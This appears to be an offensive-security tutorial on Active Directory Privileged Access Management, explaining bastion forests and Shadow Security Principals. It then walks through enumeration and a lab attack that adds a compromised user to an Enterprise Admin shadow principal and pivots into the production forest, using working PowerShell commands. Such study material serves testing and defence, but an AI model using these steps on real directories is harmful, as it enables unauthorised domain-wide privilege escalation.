## Information

The PAM model is used to delegate high-impact administrative privileges—such as _Domain Admin, Enterprise Admin, or critical infrastructure roles_—through Shadow Security Principals; it is not intended to manage normal user access or low-privilege tasks.

> PAM does not remove privilege; it centralizes it, makes it temporary, and shifts the attack target. In this model, privileges cross as authorization, not as identity.
### Real Model

Privileged Access Management (PAM) was introduced in Windows Server 2016 to mitigate risks in Active Directory environments arising from attacks such as Pass-the-Hash, credential theft, targeted phishing, and similar techniques. PAM does not remove privileges; instead, it isolates them and limits them over time, thereby reducing the attack surface. PAM introduces the following key components:

| Component                        | Real role                                                                                                                                                                             |
| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Bastion Forest                   | Isolated administrative forest that decides who can be privileged                                                                                                                     |
| Shadow Security Principals       | Objects that represent privileged SIDs from other forests                                                                                                                             |
| Time-Bound Group Membership      | Temporary privileges tied to the lifecycle of the ticket; expires in 60 minutes by default                                                                                            |
| MIM (Microsoft Identity Manager) | Decides who, when, and for how long someone can be privileged (workflow, approval, TTL) [MIM Module](https://learn.microsoft.com/en-us/powershell/module/mimpam/?view=idm-ps-2016sp1) |
| Kerberos (bastion KDC)           | Issues the ticket with privileges                                                                                                                                                     |
| Production forest                | Only validates tickets (not users) issued by the bastion KDC                                                                                                                          |

> In PAM, privileges are not assigned to identities in production; they are projected through SIDs issued by the bastion forest and evaluated by the domain controllers of the production forest.

- Shadow Security Principals were introduced for Microsoft's PAM architecture, but their existence does not strictly depend on the trust being explicitly marked as `PIM_TRUST`. In practice, what matters is that the trust relationship and its configuration allow the SIDs projected from the bastion to be accepted and evaluated in the remote forest.
- A Shadow Security Principal (SSP) is conceptually similar to a Foreign Security Principal (FSP), but instead of representing an external identity, it represents a privileged SID that will be accepted cross-forest within the PAM model.

In the classic Microsoft PAM architecture, the relationship between the bastion forest and the production forest is implemented as a one-way forest trust, where the production forest accepts authorization decisions materialized through tickets issued from the bastion.

```powershell
Bastion Forest ───► Production Forest
   (issues TGT)        (validates TGT)

From Bastion: INBOUND
From Production: OUTBOUND
```

The Bastion can authenticate to Production. Production CANNOT authenticate to the Bastion. It is worth noting that Shadow Principal does not follow typical trust logic.

- [ ] Scope

When a production forest is administered through PAM:

- Administrative groups and ACLs are not modified in production
- Privileged accounts ideally should not perform interactive logon in production, or they should be heavily restricted.
- In a mature PAM implementation, privileged groups in production can be left empty or without permanent memberships: `Domain Admins`, `Enterprise Admins`, `Schema Admins`, `Administrators` (built-in), `Account Operators`, `Server Operators`, `Backup Operators`, `DNSAdmins`, custom administrative groups (`SQL Admins`, `Exchange Admins`, etc.)

> PAM is the security gate for privilege: it controls who enters, when, for how long, and from where, without leaving the door permanently open.
### Single PAM Flow (MIM + Kerberos)

- [ ] In PAM (`test.local`)

- Group: `PAM_EA_Admins`
- User: `ADA ∈ PAM_EA_Admins (TTL)`
- Shadow Principal: 

```
CN=EA-Shadow,
msDS-ShadowPrincipalSid = S-1-5-21-CORP-519
member → PAM_EA_Admins
```

- [ ] In PROD (`corp.local`)

- Group: `Enterprise Admins (SID: S-1-5-21-CORP-519)`

- [ ] Flow

```
ADA@test.local  
   ↓  
PAM_EA_Admins (TTL membership)  
   ↓  
Shadow Principal (IN PAM)  
   ↓  
msDS-ShadowPrincipalSid → S-1-5-21-CORP-519  
   ↓  
Enterprise Admins (IN PROD)
```

When `ADA` requests access to a resource in `PROD`, the KDC of the bastion forest issues the ticket including in the PAC the SID defined in the `Shadow Principal` (`msDS-ShadowPrincipalSid`). When the production forest validates that ticket, it evaluates that SID as belonging to the corresponding privileged group and applies the resulting authorization.

| Step | Message | From → To                           | Key content                                                                                       | Result                                                       |
| ---- | ------- | ----------------------------------- | ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ |
| 1    | TGS-REQ | `ADA@test.local` → KDC `test.local` | TGT from `test.local` + SPN `ldap/DC01.corp.local`                                                | ADA requests access to a resource in `corp.local`            |
| 2    | TGS-REP | KDC `test.local` → ADA              | Inter-realm TGT (`krbtgt/corp.local`) signed with the trust key + SSP SID included in the token | Referral ticket to `corp.local` with a privileged SID        |
| 3    | TGS-REQ | ADA → KDC `corp.local`              | Inter-realm TGT + service SPN (`ldap/DC01.corp.local`)                                            | Service ticket request in production                         |
| 4    | TGS-REP | KDC `corp.local` → ADA              | Service Ticket evaluating SID `S-1-5-21-CORP-519` (Enterprise Admins)                             | Ticket issued with EA-equivalent privileges                  |
| 5    | AP-REQ  | ADA → `DC01.corp.local`             | Kerberos Service Ticket                                                                           | Authentication to the server in production                   |
| 6    | AP-REP  | `DC01.corp.local` → ADA             | Kerberos confirmation                                                                             | Access granted with Enterprise Admin privileges              |

The key point occurs in Steps 2 and 4:

- Step 2: the SSP SID travels in the token from PAM.
- Step 4: the DC in corp.local evaluates it and maps it to Enterprise Admins.

```
PAM controls privilege assignment  
PROD validates and applies them
```
### Real Impact on Offensive Techniques (Attacker View)

PAM is not something the attacker “uses.” PAM is an administrative model that removes classic escalation vectors by moving power out of production domains; with PAM, the vector does not disappear, it shifts from the production domain to the bastion forest. If PAM is well implemented:

- ❌ SIDHistory stops being a trivial path
- ❌ cross-forest Kerberos pivoting becomes much more restricted
- ❌ cross-forest Golden Ticket loses operational value
- ❌ many cross-domain delegation abuses stop being viable or become dependent on misconfiguration
- ❌ long-term persistence becomes more difficult

It does NOT eliminate everything; it only changes the game. You can still:

- Compromise the bastion / PAM forest
- Abuse misconfigurations in Shadow Principals
- Attack endpoints where access is materialized
- Steal active JIT sessions
### Objectives

In PAM environments, administrative power does not reside in production domains, but in the bastion forest and in the components that control the issuance of privileged Kerberos tickets: MIM (decision and timing), the PAM Trust (SID acceptance), the Shadow Security Principals (identity mapping), and the bastion KDC (effective privilege issuance).

- Without PAM: compromise production = win 
- With PAM: compromise the bastion = win everything

> Exploiting PAM is not breaking production; it is controlling which SIDs travel in Kerberos.

| Abuse vector                                | What you need to compromise                                                                                  | What you actually do                                         | Result                                                                   |
| ---------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------------------ |
| SSP member identity compromise              | A bastion user already a member of the Shadow Principal (e.g. `Administrator`)                               | Authenticate cross-forest into production                    | The token includes the SSP privileged SID → EA/DA privileges in prod     |
| Shadow Security Principal abuse (ACL abuse) | Permissions over the SSP object (`WriteProperty`, `GenericWrite`, `WriteDACL`)                               | Add your own identity as a member of the SSP                 | Your bastion user projects privileged permissions into production        |
| `SIDHistory` injection                      | Permissions to modify `SIDHistory` on a bastion identity (e.g. `Domain Admin` or `Enterprise Admin`)        | Add the privileged SID of the remote forest to `SIDHistory`  | The SID crosses the forest trust → effective privileges in prod         |
| PAM group compromise                        | Permissions to add members to PAM groups in the bastion                                                      | Add your identity to the privileged group                    | The group is already linked to an SSP → access to prod                  |
| MIM / PAM policy abuse                      | Control over the MIM service or workflows                                                                    | Self-approve privileges, remove TTL                          | Persistent privileged access                                            |
| Golden Ticket in bastion                    | Bastion `krbtgt` hash                                                                                        | Forge a TGT with `extraSIDs` or `SIDHistory`                 | Privileged cross-forest access                                          |
| Inter-realm trust key compromise            | Trust account hash                                                                                            | Forge referral tickets                                       | Direct authentication in the remote forest                              |
| SSP SID mapping modification                | Permissions over `msDS-ShadowPrincipalSid`                                                                   | Map your identity to a remote privileged SID                 | Full escalation into prod                                               |
## Enumeration

1. Enumerate Forest Trusts

The first step is to identify trust relationships between forests and review the relevant attributes associated with the trust.

```powershell
Get-ADTrust -Filter * | select Name,Direction,ForestTransitive,SIDFilteringQuarantined
```

- `ForestTransitive = True` → Indicates that the trust is at the forest level. This type of trust can be used in Privileged Access Management (PAM) architectures.
- `SIDFilteringQuarantined = False` → Indicates that SID filtering is relaxed, allowing SIDs from the trusted forest to cross the trust.

2. Search for Shadow Security Principals (strong confirmation)

The most reliable evidence that an environment is using Privileged Access Management (PAM) is the existence of Shadow Security Principals (SSP). These objects are stored in the container: `CN=Shadow Principal Configuration,CN=Services,<ConfigurationPartition>`

> being unable to read `CN=Configuration` is common for low-privileged users

```powershell
# AD
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl 

# Powerview
Get-DomainObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,$((Get-Domain).ConfigurationNamingContext)" -LDAPFilter "(objectClass=msDS-ShadowPrincipal)" -Properties name,member,msDS-ShadowPrincipalSid | fl name,member,msDS-ShadowPrincipalSid
# Name                    : accforest-ShadowEnterpriseAdmin
# member                  : {CN=Administrator,CN=Users,DC=test,DC=local}
# msDS-ShadowPrincipalSid : S-1-5-21-3331877400-209796306-1317730910-519
```

- `Name: accforest-ShadowEnterpriseAdmin`: Shadow Security Principal (SSP) object that represents a privileged role in the remote forest (`Enterprise Admins`). The SSP lives in the bastion forest and allows privileges to be mapped into the production forest.
- `member: CN=Administrator,CN=Users,DC=test,DC=local`: Bastion forest identity that temporarily receives the privilege represented by the SSP.
- `msDS-ShadowPrincipalSid: S-1-5-21-...-519`: SID of the Enterprise Admins group in the remote forest (`RID 519`). When an SSP member authenticates in the remote forest, this SID is included in the Kerberos token.

The `msDS-ShadowPrincipalSid` objects represent identities from the administrative forest that have been authorized to obtain privileges inside the production forest. Their presence indicates that the environment is using Privileged Access Management (PAM) to delegate privileged access in a controlled way across forests.

- PIM_TRUST + Shadow Principals → strong evidence of operational PAM
- PIM_TRUST without Shadow Principals → PAM capability is present, but not necessarily in use
- Shadow Principals without PIM_TRUST → PAM-style delegation is observable, although not necessarily in Microsoft's canonical form

## Shadow Security Principal Abuse (`ACL abuse`)

In this scenario, the attack consists of Shadow Security Principal abuse, where an attacker with sufficient permissions in the bastion forest can modify the SSP object and add their own identity as a member. In this case, we have a compromised user (`ada`) who has administrative privileges in `test.local`, allowing objects inside the container to be modified:

```
CN=Shadow Principal Configuration,CN=Services,CN=Configuration
```

By adding their identity as a member of the SSP, the user will inherit the privileged SID of the remote forest during cross-forest authentication.

```
1. Compromised user in test.local
   ada
        ↓
2. The user is added to the Shadow Principal
   accforest-ShadowEnterpriseAdmin
        ↓
3. The Shadow Principal represents the remote SID
   Enterprise Admins (corp.local)
        ↓
4. Authentication through the forest trust
        ↓
5. The remote DC evaluates the SID in the token
        ↓
6. ada obtains privileges
   Enterprise Admin in corp.local
```

1. Shadow Principal abuse

> This allows the user to be added to the Shadow Principal object

```powershell
Set-ADObject -Identity "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=test,DC=local" -Add @{'member'="CN=ada,CN=Users,DC=test,DC=local"}

# Verification:
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid
# Name                    : corpforest-ShadowEnterpriseAdmin
# member                  : {CN=ada,CN=Users,DC=test,DC=local}
# msDS-ShadowPrincipalSid : S-1-5-21-3331877400-209796306-1317730910-519
```

From that point on, when user `ada` authenticates to `corp.local`, their token will include the SID of the Enterprise Admins group from the remote forest.

2. Pivot to the remote forest

```powershell
$test = ConvertTo-SecureString "Password123" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("test.local\ada",$test)
$corp = New-PSSession -ComputerName 192.168.100.1 -Credential $cred

# Confirm the remote context
Enter-PSsession -session $corp
```

